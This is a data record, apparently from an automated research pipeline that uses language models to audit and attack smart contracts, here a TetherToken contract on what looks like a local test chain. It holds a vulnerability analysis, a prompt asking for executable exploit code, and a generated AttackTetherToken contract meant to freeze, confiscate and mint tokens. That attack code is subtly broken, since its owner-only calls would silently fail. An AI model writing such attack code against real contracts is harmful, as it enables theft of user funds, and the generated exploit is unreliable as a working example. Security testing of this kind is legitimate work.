public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features: pausable functionality, blacklist management, upgradeability, and token issuance/redemption controlled by the owner. It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances (not ETH) and manages token transfers with optional fees. It also supports deprecation and upgrade to a new contract address.\n\nKey features and components:  \n- **Ownable**: Owner control over critical functions.  \n- **Pausable**: Owner can pause/unpause token transfers.  \n- **BlackList**: Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted funds.  \n- **Upgradeability**: The contract can be deprecated in favor of an upgraded contract address, forwarding calls to it.  \n- **Fee mechanism**: basisPointsRate and maximumFee allow charging fees on transfers, credited to the owner.  \n- **Issue/Redeem**: Owner can mint new tokens or burn tokens from their balance.\n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2. Vulnerability Assessment:\n\n**A. Centralization and Owner Privileges (High Risk)**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can blacklist any address arbitrarily, freezing their tokens.  \n  - Can destroy blacklisted users‚Äô tokens, reducing total supply.  \n  - Can issue (mint) unlimited tokens to self, inflating supply arbitrarily.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect all token operations to an upgraded contract.  \n- Impact: Owner can censor users, confiscate tokens, inflate supply, or replace contract logic at will. This centralization risk is critical for trust and security.\n\n**B. Blacklist and Destroy Black Funds Logic**  \n- `destroyBlackFunds` zeroes out blacklisted user‚Äôs balance and reduces total supply accordingly.  \n- This function can be abused by owner to confiscate tokens from any blacklisted user without their consent.  \n- No user consent or appeal mechanism.\n\n**C. Upgradeability Risks**  \n- The owner can set an upgraded contract address and mark the current contract as deprecated.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control of their tokens.  \n- No multisig or timelock on upgrade.\n\n**D. Fee Parameters Setting**  \n- Owner can set `basisPointsRate` and `maximumFee` with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- While limits exist, owner can still impose fees up to 0.2% and max 50 tokens per transfer (assuming decimals=18).  \n- Fees go to owner, which may be unexpected by users.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is good practice.\n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations.  \n- No external calls in state-changing functions except forwarding to upgraded contract when deprecated.  \n- No payable functions accepting ETH, so no ETH-related vulnerabilities.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attacks on `transfer`, `transferFrom`, and `approve`.  \n- This is good practice.\n\n---\n\n3. Exploitation Requirements:\n\n- To exploit the centralization risks, an attacker would need to gain control of the **owner** account.  \n- With owner privileges, the attacker can:  \n  - Pause the contract to freeze all transfers.  \n  - Blacklist any user and destroy their tokens.  \n  - Mint unlimited tokens to inflate supply and devalue tokens.  \n  - Deprecate the contract and redirect users to a malicious upgraded contract.  \n- No direct vulnerabilities allow non-owner users to exploit these features.  \n- No reentrancy or arithmetic exploits found.  \n- No backdoors or hidden functions detected.\n\n---\n\n**Summary:**  \nThe contract is a standard, well-implemented ERC20 token with pausable, blacklist, and upgradeability features. It properly uses SafeMath and mitigates known ERC20 issues like short address attack and approve race condition. However, it is highly centralized with the owner having critical powers that can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary contracts. This centralization is the main security and trust concern.\n\n---\n\n**Final notes:**  \n- Solidity version: `pragma solidity ^0.4.17`  \n- No reentrancy, math, or logic bugs detected beyond owner centralization risks.  \n- Owner key compromise or malicious owner actions pose the greatest threat.', 'contract_analysis': 'The main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features: pausable functionality, blacklist management, upgradeability, and token issuance/redemption controlled by the owner. It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances (not ETH) and manages token transfers with optional fees. It also supports deprecation and upgrade to a new contract address.\n\nKey features and components:  \n- **Ownable**: Owner control over critical functions.  \n- **Pausable**: Owner can pause/unpause token transfers.  \n- **BlackList**: Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted funds.  \n- **Upgradeability**: The contract can be deprecated in favor of an upgraded contract address, forwarding calls to it.  \n- **Fee mechanism**: basisPointsRate and maximumFee allow charging fees on transfers, credited to the owner.  \n- **Issue/Redeem**: Owner can mint new tokens or burn tokens from their balance.\n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2.', 'vulnerability_assessment': '**A. Centralization and Owner Privileges (High Risk)**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can blacklist any address arbitrarily, freezing their tokens.  \n  - Can destroy blacklisted users‚Äô tokens, reducing total supply.  \n  - Can issue (mint) unlimited tokens to self, inflating supply arbitrarily.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect all token operations to an upgraded contract.  \n- Impact: Owner can censor users, confiscate tokens, inflate supply, or replace contract logic at will. This centralization risk is critical for trust and security.\n\n**B. Blacklist and Destroy Black Funds Logic**  \n- `destroyBlackFunds` zeroes out blacklisted user‚Äôs balance and reduces total supply accordingly.  \n- This function can be abused by owner to confiscate tokens from any blacklisted user without their consent.  \n- No user consent or appeal mechanism.\n\n**C. Upgradeability Risks**  \n- The owner can set an upgraded contract address and mark the current contract as deprecated.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control of their tokens.  \n- No multisig or timelock on upgrade.\n\n**D. Fee Parameters Setting**  \n- Owner can set `basisPointsRate` and `maximumFee` with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- While limits exist, owner can still impose fees up to 0.2% and max 50 tokens per transfer (assuming decimals=18).  \n- Fees go to owner, which may be unexpected by users.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is good practice.\n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations.  \n- No external calls in state-changing functions except forwarding to upgraded contract when deprecated.  \n- No payable functions accepting ETH, so no ETH-related vulnerabilities.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attacks on `transfer`, `transferFrom`, and `approve`.  \n- This is good practice.\n\n---\n\n3.', 'exploitation_requirements': '- To exploit the centralization risks, an attacker would need to gain control of the **owner** account.  \n- With owner privileges, the attacker can:  \n  - Pause the contract to freeze all transfers.  \n  - Blacklist any user and destroy their tokens.  \n  - Mint unlimited tokens to inflate supply and devalue tokens.  \n  - Deprecate the contract and redirect users to a malicious upgraded contract.  \n- No direct vulnerabilities allow non-owner users to exploit these features.  \n- No reentrancy or arithmetic exploits found.  \n- No backdoors or hidden functions detected.', 'analysis_duration': 23.9703152179718}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features: pausable functionality, blacklist management, upgradeability, and token issuance/redemption controlled by the owner. It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances (not ETH) and manages token transfers with optional fees. It also supports deprecation and upgrade to a new contract address.\n\nKey features and components:  \n- **Ownable**: Owner control over critical functions.  \n- **Pausable**: Owner can pause/unpause token transfers.  \n- **BlackList**: Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted funds.  \n- **Upgradeability**: The contract can be deprecated in favor of an upgraded contract address, forwarding calls to it.  \n- **Fee mechanism**: basisPointsRate and maximumFee allow charging fees on transfers, credited to the owner.  \n- **Issue/Redeem**: Owner can mint new tokens or burn tokens from their balance.\n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2.\n\nVulnerability Assessment: **A. Centralization and Owner Privileges (High Risk)**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can blacklist any address arbitrarily, freezing their tokens.  \n  - Can destroy blacklisted users‚Äô tokens, reducing total supply.  \n  - Can issue (mint) unlimited tokens to self, inflating supply arbitrarily.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect all token operations to an upgraded contract.  \n- Impact: Owner can censor users, confiscate tokens, inflate supply, or replace contract logic at will. This centralization risk is critical for trust and security.\n\n**B. Blacklist and Destroy Black Funds Logic**  \n- `destroyBlackFunds` zeroes out blacklisted user‚Äôs balance and reduces total supply accordingly.  \n- This function can be abused by owner to confiscate tokens from any blacklisted user without their consent.  \n- No user consent or appeal mechanism.\n\n**C. Upgradeability Risks**  \n- The owner can set an upgraded contract address and mark the current contract as deprecated.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control of their tokens.  \n- No multisig or timelock on upgrade.\n\n**D. Fee Parameters Setting**  \n- Owner can set `basisPointsRate` and `maximumFee` with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- While limits exist, owner can still impose fees up to 0.2% and max 50 tokens per transfer (assuming decimals=18).  \n- Fees go to owner, which may be unexpected by users.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is good practice.\n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations.  \n- No external calls in state-changing functions except forwarding to upgraded contract when deprecated.  \n- No payable functions accepting ETH, so no ETH-related vulnerabilities.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attacks on `transfer`, `transferFrom`, and `approve`.  \n- This is good practice.\n\n---\n\n3.\n\nExploitation Requirements: - To exploit the centralization risks, an attacker would need to gain control of the **owner** account.  \n- With owner privileges, the attacker can:  \n  - Pause the contract to freeze all transfers.  \n  - Blacklist any user and destroy their tokens.  \n  - Mint unlimited tokens to inflate supply and devalue tokens.  \n  - Deprecate the contract and redirect users to a malicious upgraded contract.  \n- No direct vulnerabilities allow non-owner users to exploit these features.  \n- No reentrancy or arithmetic exploits found.  \n- No backdoors or hidden functions detected.\n\n\nTarget Contract Address: 0x0E696947A06550DEf604e82C26fd9E493e576337\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': '```solidity\npragma solidity 0.4.17;\n\ncontract AttackTetherToken {\n    address public owner;\n    address public target;\n\n    function AttackTetherToken(address _target) public {\n        owner = msg.sender;\n        target = _target;\n    }\n\n    function attack(address victim, address upgraded) public {\n        require(msg.sender == owner);\n\n        // Pause the contract\n        target.call(bytes4(keccak256("pause()")));\n\n        // Blacklist victim\n        target.call(bytes4(keccak256("addBlackList(address)")), victim);\n\n        // Destroy victim\'s blacklisted funds\n        target.call(bytes4(keccak256("destroyBlackFunds(address)")), victim);\n\n        // Mint unlimited tokens to attacker\n        target.call(bytes4(keccak256("issue(uint256)")), 1000000000000000000000000000);\n\n        // Deprecate contract to upgraded malicious contract\n        target.call(bytes4(keccak256("deprecate(address)")), upgraded);\n    }\n}\n```', 'code': 'pragma solidity 0.4.17;\n\ncontract AttackTetherToken {\n    address public owner;\n    address public target;\n\n    function AttackTetherToken(address _target) public {\n        owner = msg.sender;\n        target = _target;\n    }\n\n    function attack(address victim, address upgraded) public {\n        require(msg.sender == owner);\n\n        // Pause the contract\n        target.call(bytes4(keccak256("pause()")));\n\n        // Blacklist victim\n        target.call(bytes4(keccak256("addBlackList(address)")), victim);\n\n        // Destroy victim\'s blacklisted funds\n        target.call(bytes4(keccak256("destroyBlackFunds(address)")), victim);\n\n        // Mint unlimited tokens to attacker\n        target.call(bytes4(keccak256("issue(uint256)")), 1000000000000000000000000000);\n\n        // Deprecate contract to upgraded malicious contract\n        target.call(bytes4(keccak256("deprecate(address)")), upgraded);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 5.201626300811768}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpzqyp3b34.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x0E696947A06550DEf604e82C26fd9E493e576337",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x0E696947A06550DEf604e82C26fd9E493e576337": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": 